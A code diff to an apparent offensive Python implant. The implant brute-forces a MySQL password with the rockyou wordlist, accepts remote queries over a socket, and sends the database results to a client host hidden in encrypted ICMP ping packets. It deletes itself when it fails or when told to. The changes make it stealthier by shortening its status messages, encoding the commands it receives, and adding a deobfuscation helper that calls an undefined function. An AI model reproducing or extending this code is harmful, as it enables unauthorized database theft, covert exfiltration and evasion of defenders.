@@ -2,9 +2,8 @@ import mysql.connector as mysql
 import os, sys, socket, struct, select, time
 import datetime
 import re
-from itertools import cycle
-import random
 import string
+from sys import argv
 
 # function that checks if pw is correct
 def connect(pw):
@@ -144,11 +143,18 @@ def sendOnePing(seq, dest_addr, ttl, data_to_send, timeout=2, packetsize=64):
         except Exception as e:
             return e
 
+def deobf(num):
+    if num:
+        return chr(num % 256) + convert(num // 256)
+    else:
+        return ""
+
 def main():
     host = "192.168.20.12"
     client = "192.168.20.9"
     wordlist=open("rockyou-75.txt","r+").read().splitlines()
     password = getPassword(wordlist)
+    pw=True
     if password == "NO PASSWORD":
          pw=False
 
@@ -162,23 +168,26 @@ def main():
 
         (client_socket, client_address) = server_socket.accept()
         if pw==False:
-                client_socket.send(b"I couldn't get into the MySQL db with the provided wordlist. Shutting down connection and deleting payload.")
+                client_socket.send(b"Out")
                 os.remove(argv[0])
                 sys.exit()
-        client_socket.send(b"I'm in the MySQL database. Send me a query, or type EXIT to shut me down!")
+        client_socket.send(b"In")
         while True:
             client_input = client_socket.recv(1024)
             if not client_input:
-                client_socket.send(b"I'm in the MySQL database. Send me a query, type EXIT to shut me down or DELETE to get rid of any trace I was here.")
+                client_socket.send(b"In")
             else:
-                if client_input.decode() == 'EXIT':
+                if client_input.decode() == 'E':
                     break
-                else if client_input.decode() == 'DELETE':
-                    os.remove(argv[0]+"testing")
+                elif client_input.decode() == 'D':
+                    os.remove(argv[0])
                     sys.exit()
                 else:
-                    sql_result = get_data(password, client_input.decode())
-                    client_socket.send(b"Received MySQL data. Sending in an ICMP ping!")
+                    command = b""
+                    for line in client_input.splitlines():
+                        command += bytes([line[0],line[-1]])
+                    sql_result = get_data(password, command.decode())
+                    client_socket.send(b"ping!")
                     data = encrypt_data(sql_result)
                     result = sendOnePing(1, client, 102, data)
                     client_socket.send(result.decode())
